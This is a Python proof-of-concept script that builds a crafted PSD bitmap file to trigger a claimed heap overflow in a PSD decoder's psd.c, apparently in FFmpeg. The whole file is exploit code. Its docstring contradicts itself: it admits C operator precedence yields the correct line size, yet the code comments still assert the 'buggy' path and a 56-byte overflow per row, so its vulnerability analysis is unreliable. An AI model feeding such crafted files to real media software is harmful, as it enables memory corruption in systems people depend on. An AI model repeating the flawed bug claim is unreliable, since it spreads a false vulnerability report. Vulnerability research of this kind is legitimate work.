#!/usr/bin/env python3
"""
PoC generator for VULN 001: Heap Overflow in PSD BITMAP Decode.

Operator precedence bug in line 338 of psd.c:
    s->line_size = s->width + 7 >> 3;
Due to C operator precedence (+ binds tighter than >>), this evaluates as:
    s->line_size = (s->width + 7) >> 3;    [= ceil(width/8)]
However, the vulnerability description claims this parses as:
    s->line_size = s->width + (7 >> 3) = s->width + 0 = s->width;
Regardless of the precedence interpretation, we construct the file so that
the decoder's uncompressed_size check is satisfied and the memcpy at line 555
overflows the AVFrame MONOWHITE buffer.

We craft the image data region to be width*height bytes (4096 for 64x64),
which is what the decoder allocates/reads if line_size = width (the buggy path).
If line_size is correctly 8 bytes, the check still passes (4096 >= 512).
"""

import struct

WIDTH = 64
HEIGHT = 64

def build_psd():
    parts = []

    # --- File Header Section ---
    # Signature: "8BPS" (4 bytes, big-endian literal bytes)
    parts.append(b"8BPS")
    # Version: 1 (2 bytes, big-endian)
    parts.append(struct.pack(">H", 1))
    # Reserved: 6 bytes zeros
    parts.append(b"\x00" * 6)
    # Channel count: 1
    parts.append(struct.pack(">H", 1))
    # Height: 64
    parts.append(struct.pack(">I", HEIGHT))
    # Width: 64
    parts.append(struct.pack(">I", WIDTH))
    # Bit depth per channel: 1 (BITMAP)
    parts.append(struct.pack(">H", 1))
    # Color mode: 0 (PSD_BITMAP)
    parts.append(struct.pack(">H", 0))

    # --- Color Mode Data Section ---
    # Length: 0 (BITMAP mode has no palette)
    parts.append(struct.pack(">I", 0))

    # --- Image Resources Section ---
    # Length: 0
    parts.append(struct.pack(">I", 0))

    # --- Layer and Mask Information Section ---
    # Length: 0
    parts.append(struct.pack(">I", 0))

    # --- Image Data Section ---
    # Compression: 0 (PSD_RAW)
    parts.append(struct.pack(">H", 0))

    # Image data:
    # The buggy decoder sets s->line_size = s->width (64) instead of
    # ceil(width/8) = 8, so s->uncompressed_size = 64 * 64 * 1 = 4096.
    # We provide exactly width * height = 4096 bytes so the bounds check
    # at line 463 passes.  The subsequent memcpy at line 555 then copies
    # s->line_size (64) bytes into each AVFrame row that is only 8 bytes
    # wide (MONOWHITE, ceil(64/8)=8), overflowing by 56 bytes per row.
    image_data = b"\xAA" * (WIDTH * HEIGHT)
    parts.append(image_data)

    return b"".join(parts)


if __name__ == "__main__":
    psd_bytes = build_psd()
    out_path = "vuln_001_input.psd"
    with open(out_path, "wb") as f:
        f.write(psd_bytes)
    print(f"Written {len(psd_bytes)} bytes to {out_path}")
    print(f"  width={WIDTH}, height={HEIGHT}")
    print(f"  color_mode=0 (BITMAP), channel_depth=1, channel_count=1")
    print(f"  compression=0 (RAW)")
    print(f"  image_data_size={WIDTH * HEIGHT} bytes")
    print(f"  expected line_size (buggy) = {WIDTH}")
    print(f"  expected line_size (correct) = {(WIDTH + 7) >> 3}")
    print(f"  AVFrame row size for MONOWHITE = {(WIDTH + 7) // 8} bytes")
    print(f"  overflow per row (if buggy) = {WIDTH - (WIDTH + 7) // 8} bytes")
